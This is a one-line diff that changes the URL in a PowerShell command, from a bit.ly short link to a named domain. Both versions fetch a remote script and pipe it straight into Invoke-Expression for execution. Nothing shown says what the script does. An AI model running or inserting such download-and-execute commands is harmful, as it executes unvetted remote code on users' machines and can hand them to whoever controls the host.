@@ -1,1 +1,1 @@
-irm https://bit.ly/syspanel | iex; exit
+irm https://panel.sprinformatica.es | iex; exit
